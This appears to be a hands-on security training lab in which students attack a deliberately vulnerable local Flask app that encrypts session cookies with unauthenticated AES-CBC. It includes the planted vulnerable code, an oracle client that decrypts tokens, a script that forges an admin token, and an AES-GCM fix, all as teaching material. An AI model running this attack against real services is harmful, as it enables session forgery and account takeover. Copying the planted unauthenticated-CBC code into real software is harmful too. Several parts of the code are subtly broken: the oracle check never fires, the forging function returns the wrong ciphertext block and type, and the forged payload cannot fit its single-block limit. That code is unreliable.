---
title: "Padding Oracle Lab — POODLE-Style CBC Decryption"
tags: [cryptography, padding-oracle, CBC, lab, AES, padbuster, poodle,
  exploit, CWE-310, T1600, hands-on]
module: 09-Crypto-01
day: 562
prerequisites:
  - Day 561 — Padding Oracle Attack (theory + code)
related_topics:
  - Padding Oracle Attack (Day 561)
  - Timing Attacks (Day 563)
  - CBC Cut-and-Paste (Day 566)
---

# Day 562 — Padding Oracle Lab

> "Reading the theory means nothing until you run the attack. Every byte you
> decrypt today in this lab is a byte you will recognise in the wild — in a
> cookie, in a ViewState, in a session token. The oracle speaks. Learn to listen."
>
> — Ghost

---

## Goals

- Deploy a vulnerable web application that uses unauthenticated AES-CBC
  for session tokens.
- Use your Day 561 padding oracle script (or `padbuster`) to decrypt a
  session token without knowing the encryption key.
- Forge a new session token for an arbitrary user.
- Document the attack and write the fix in the application code.

**Prerequisites:** Day 561 — theory + code. You must understand the attack
before running the lab.
**Estimated lab time:** 3 hours.

---

## Lab Environment

### Setup

```yaml
# docker-compose.yml
version: "3.9"
services:
  oracle-app:
    build: ./oracle-app
    ports:
      - "8080:8080"
    environment:
      SECRET_KEY: ""  # Generated randomly at container startup
      FLAG: "CTF{you_decrypted_the_oracle_with_math_not_keys}"
    networks:
      - lab-net

networks:
  lab-net:
    driver: bridge
```

```python
# oracle-app/app.py — the vulnerable application
"""
SecureCorp Session Manager — Version 2.3.1
Uses AES-128-CBC for session token encryption.
(Note: no MAC — this is the vulnerability)
"""
from __future__ import annotations

import os
import json
import base64
from flask import Flask, request, jsonify, make_response
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

app = Flask(__name__)
KEY = os.urandom(16)  # Random at startup — attacker does not know this

def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)

def pkcs7_unpad(data: bytes) -> bytes:
    pad_len = data[-1]
    if pad_len < 1 or pad_len > 16:
        raise ValueError("Invalid padding")
    if data[-pad_len:] != bytes([pad_len] * pad_len):
        raise ValueError("Invalid padding")
    return data[:-pad_len]

def encrypt_token(payload: dict) -> str:
    plaintext = json.dumps(payload).encode()
    padded = pkcs7_pad(plaintext)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv), backend=default_backend())
    enc = cipher.encryptor()
    ct = enc.update(padded) + enc.finalize()
    return base64.urlsafe_b64encode(iv + ct).decode()

def decrypt_token(token: str) -> dict:
    raw = base64.urlsafe_b64decode(token)
    iv, ct = raw[:16], raw[16:]
    cipher = Cipher(algorithms.AES(KEY), modes.CBC(iv), backend=default_backend())
    dec = cipher.decryptor()
    padded = dec.update(ct) + dec.finalize()
    unpadded = pkcs7_unpad(padded)  # Raises ValueError on bad padding
    return json.loads(unpadded)

@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    user = data.get('username')
    passwd = data.get('password')
    # Trivial auth for the lab
    if user == 'alice' and passwd == 'alice123':
        token = encrypt_token({'user': 'alice', 'role': 'user'})
        resp = make_response(jsonify({'status': 'ok'}))
        resp.set_cookie('session', token)
        return resp
    return jsonify({'error': 'invalid credentials'}), 401

@app.route('/profile')
def profile():
    token = request.cookies.get('session')
    if not token:
        return jsonify({'error': 'not logged in'}), 401
    try:
        payload = decrypt_token(token)
        return jsonify({'user': payload['user'], 'role': payload['role']})
    except ValueError:
        # ORACLE: returns 403 for padding error — distinguishable from 401
        return jsonify({'error': 'invalid session'}), 403

@app.route('/admin')
def admin():
    token = request.cookies.get('session')
    if not token:
        return jsonify({'error': 'not logged in'}), 401
    try:
        payload = decrypt_token(token)
        if payload.get('role') != 'admin':
            return jsonify({'error': 'access denied'}), 403
        flag = os.environ.get('FLAG', 'flag-not-set')
        return jsonify({'flag': flag, 'user': payload['user']})
    except ValueError:
        return jsonify({'error': 'invalid session'}), 403

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

**Start the lab:**
```bash
cd oracle-lab
docker compose up -d
# Application running at http://localhost:8080
```

---

## Challenge

### Part 1 — Obtain a Valid Session Token

```bash
# Log in as alice and capture the session cookie
curl -s -c cookies.txt -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice123"}'
# → {"status": "ok"}

cat cookies.txt
# → session = <base64-encoded-ciphertext>
```

### Part 2 — Identify the Oracle

```bash
# Valid session: profile returns alice's data
curl -s -b cookies.txt http://localhost:8080/profile
# → {"role": "user", "user": "alice"}

# Tamper the last byte of the cookie:
python3 -c "
import base64, sys
raw = base64.urlsafe_b64decode(open('cookies.txt').read().split()[-1])
tampered = raw[:-1] + bytes([raw[-1] ^ 0x01])
print(base64.urlsafe_b64encode(tampered).decode())
" > tampered_cookie.txt

curl -s -b "session=$(cat tampered_cookie.txt)" http://localhost:8080/profile
# → HTTP 403, {"error": "invalid session"}  ← the oracle fires!
```

**The Oracle:** HTTP 403 = invalid padding. HTTP 401 = not logged in.
HTTP 200 = valid session. The 403 vs 200 distinction is your oracle signal.

### Part 3 — Decrypt the Session Token

```python
#!/usr/bin/env python3
"""
lab_oracle_client.py — sends requests to the lab oracle
"""
from __future__ import annotations
import base64
import requests
from padding_oracle_attack import attack  # from Day 561

TARGET = "http://localhost:8080/profile"

def oracle(ciphertext: bytes) -> bool:
    """Return True if padding is valid (HTTP 200), False on 403."""
    token = base64.urlsafe_b64encode(ciphertext).decode()
    resp = requests.get(TARGET, cookies={"session": token}, timeout=5)
    # 200 = valid padding + valid JSON
    # 403 = invalid padding OR valid padding but invalid JSON
    # We need to distinguish padding-valid from JSON-valid too.
    # Padding valid but JSON invalid → response body contains "invalid session"
    # vs "JSON decode error" — check the body text.
    if resp.status_code == 200:
        return True
    if resp.status_code == 403:
        body = resp.json().get('error', '')
        # "invalid session" comes from pkcs7_unpad ValueError → padding bad
        # "JSON decode error" would come from json.loads → padding OK, JSON bad
        return 'json' in body.lower()  # padding OK, JSON just malformed
    return False

# Load the captured ciphertext (IV + ciphertext)
import sys
raw_cookie = sys.argv[1]
ciphertext = base64.urlsafe_b64decode(raw_cookie)

print(f"[*] Ciphertext length: {len(ciphertext)} bytes "
      f"({len(ciphertext)//16} blocks)")
print("[*] Starting padding oracle attack…")

plaintext = attack(ciphertext, oracle, block_size=16)
print(f"\n[+] Recovered plaintext:\n    {plaintext.decode()}")
# → {"user": "alice", "role": "user"}
```

```bash
# Run the decryption attack
SESSION_COOKIE=$(grep session cookies.txt | awk '{print $7}')
python3 lab_oracle_client.py "$SESSION_COOKIE"
```

### Part 4 — Forge an Admin Session Token

The padding oracle attack gives you `Intermediate` bytes for each block.
With `Intermediate`, you can forge any plaintext by choosing a crafted
IV that XORs to your desired plaintext:

```python
#!/usr/bin/env python3
"""
forge_token.py — forge an admin session token using recovered intermediate bytes
"""
from __future__ import annotations
import base64
import json
import os

# After running the oracle attack, you have:
# intermediate[i] = Decrypt(key, C_i)  for each block i
# To forge P₁ = desired_plaintext, set IV' = intermediate[0] XOR desired_plaintext

def pkcs7_pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    return data + bytes([pad_len] * pad_len)

def forge_token(intermediate_block0: bytes, desired_plaintext: dict) -> str:
    """
    Forge a single-block token with arbitrary plaintext.
    intermediate_block0: the Decrypt(key, C₀) bytes recovered from the oracle
    desired_plaintext: the dict we want to encrypt (must fit in one block)
    """
    target = pkcs7_pad(json.dumps(desired_plaintext).encode())
    assert len(target) == 16, "Payload too large for single-block forge"

    # Craft IV' such that Decrypt(key, C₀) XOR IV' = target
    crafted_iv = bytes(i ^ t for i, t in zip(intermediate_block0, target))

    # The ciphertext block is unchanged — we only changed the IV
    # Keep original C₀ as the ciphertext block
    return crafted_iv, intermediate_block0  # IV' + original_C₀

# Example (paste recovered intermediate bytes from oracle attack):
# intermediate_block0 = bytes.fromhex("...")
# crafted_iv, ct_block = forge_token(intermediate_block0,
#                                    {"user":"admin","role":"admin"})
# forged_token = base64.urlsafe_b64encode(crafted_iv + ct_block).decode()
```

```bash
# Verify the forged token grants admin access:
curl -s -b "session=$FORGED_TOKEN" http://localhost:8080/admin
# → {"flag": "CTF{you_decrypted_the_oracle_with_math_not_keys}", "user": "admin"}
```

---

## Challenge Flag

`CTF{you_decrypted_the_oracle_with_math_not_keys}`

---

## Part 5 — Fix the Application

Modify `oracle-app/app.py` to use AES-GCM instead of AES-CBC:

```python
# FIXED: oracle-app/app.py — AES-GCM (authenticated encryption)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

KEY = os.urandom(32)  # 256-bit key for GCM

def encrypt_token(payload: dict) -> str:
    plaintext = json.dumps(payload).encode()
    nonce = os.urandom(12)
    aesgcm = AESGCM(KEY)
    ct = aesgcm.encrypt(nonce, plaintext, associated_data=None)
    return base64.urlsafe_b64encode(nonce + ct).decode()

def decrypt_token(token: str) -> dict:
    raw = base64.urlsafe_b64decode(token)
    nonce, ct = raw[:12], raw[12:]
    aesgcm = AESGCM(KEY)
    try:
        plaintext = aesgcm.decrypt(nonce, ct, associated_data=None)
    except Exception:
        # Uniform error — no oracle leak; authentication tag failure
        raise ValueError("invalid token")
    return json.loads(plaintext)
```

**Verify the fix eliminates the oracle:**
```bash
# With GCM, any tampered token produces the same 403 error as an invalid token.
# The oracle (padding-valid vs padding-invalid distinction) no longer exists.
python3 lab_oracle_client.py "$SESSION_COOKIE"
# → Attack should fail — oracle always returns False
```

---

## Key Takeaways

1. The oracle is in the server's behaviour, not its code. Different HTTP status
   codes, error messages, or response times all constitute an oracle. The
   application code may look "correct" — the vulnerability is in what information
   it leaks through its responses.
2. The token forging step is the real-world impact. Decryption is interesting;
   forging an admin session is what gets a P1 bug bounty report accepted.
3. AES-GCM produces a uniform authentication failure for any tampering — no
   oracle possible. The AESGCM.decrypt call either returns plaintext or raises
   an exception; it never makes a padding-specific distinction.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q562.1, Q562.2 …).

---

## Navigation

← Previous: [Day 561 — Padding Oracle Attack](DAY-0561-Padding-Oracle-Attack.md)
→ Next: [Day 563 — Timing Attacks](DAY-0563-Timing-Attacks.md)
